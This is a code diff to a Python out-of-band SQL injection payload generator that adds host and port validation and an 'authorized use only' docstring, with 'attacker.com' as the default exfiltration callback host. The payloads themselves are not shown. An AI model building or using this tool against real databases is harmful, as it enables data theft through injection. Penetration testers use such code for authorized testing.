@@ -15,6 +15,53 @@ from enum import Enum
 from dataclasses import dataclass
 
 
+# ---------------------------------------------------------------------------
+# Input validation helpers
+# ---------------------------------------------------------------------------
+
+def _validate_host(host: str) -> str:
+    """Validate and normalise an attacker host value.
+
+    Args:
+        host: Attacker-controlled hostname or IP address.
+
+    Returns:
+        The stripped host string.
+
+    Raises:
+        ValueError: If *host* is not a string, is empty, or contains only whitespace.
+    """
+    if not isinstance(host, str):
+        raise ValueError(
+            f"attacker_host must be a non-empty string, got {type(host).__name__!r}."
+        )
+    if not host.strip():
+        raise ValueError(
+            "attacker_host must be a non-empty string (hostname or IP address)."
+        )
+    return host.strip()
+
+
+def _validate_port(port: int) -> int:
+    """Validate an attacker listener port number.
+
+    Args:
+        port: Port number to validate.  Must be an integer.
+
+    Returns:
+        The validated port integer.
+
+    Raises:
+        ValueError: If *port* is not an integer or is outside the valid range
+                    1–65535.
+    """
+    if not isinstance(port, int) or not (1 <= port <= 65535):
+        raise ValueError(
+            f"attacker_port must be an integer between 1 and 65535, got {port!r}."
+        )
+    return port
+
+
 class OOBTechnique(Enum):
     """Out-of-Band exfiltration techniques"""
     # MS-SQL techniques
@@ -53,28 +100,47 @@ class OOBPayload:
 class OOBPayloadGenerator:
     """
     Generate Out-of-Band SQL injection payloads for data exfiltration.
-    
-    OOB techniques allow attackers to extract data via alternative channels
-    when direct query results are not visible (e.g., blind SQL injection).
+
+    OOB techniques allow authorized security testers to extract data via
+    alternative channels when direct query results are not visible (e.g.,
+    blind SQL injection).
+
+    **Important – Authorized use only**: OOB payloads interact with remote
+    systems in ways that may be detected and logged.  Only use against targets
+    for which you have explicit written authorization to perform security
+    testing.
     """
-    
+
     def __init__(self, attacker_host: str = "attacker.com", attacker_port: int = 80):
         """
         Initialize OOB payload generator.
-        
+
         Args:
-            attacker_host: Attacker-controlled domain/IP for receiving callbacks
-            attacker_port: Port for HTTP/SMB listeners
+            attacker_host: Attacker-controlled domain/IP for receiving callbacks.
+                           Must be a non-empty string.
+            attacker_port: Port for HTTP/SMB listeners.  Must be 1–65535.
+
+        Raises:
+            ValueError: If *attacker_host* is empty or *attacker_port* is
+                        outside the valid range.
         """
-        self.attacker_host = attacker_host
-        self.attacker_port = attacker_port
-        self.attacker_ip = attacker_host  # For cases where IP is needed
-    
+        self.attacker_host = _validate_host(attacker_host)
+        self.attacker_port = _validate_port(attacker_port)
+        self.attacker_ip = self.attacker_host  # For cases where IP is needed
+
     def set_attacker_host(self, host: str, port: int = 80):
-        """Update attacker host and port"""
-        self.attacker_host = host
-        self.attacker_port = port
-        self.attacker_ip = host
+        """Update attacker host and port.
+
+        Args:
+            host: Attacker-controlled hostname or IP.  Must be non-empty.
+            port: Listener port.  Must be 1–65535.
+
+        Raises:
+            ValueError: If *host* is empty or *port* is out of range.
+        """
+        self.attacker_host = _validate_host(host)
+        self.attacker_port = _validate_port(port)
+        self.attacker_ip = self.attacker_host
     
     def generate_mssql_payloads(self, data_to_exfiltrate: str = "@@version") -> List[OOBPayload]:
         """
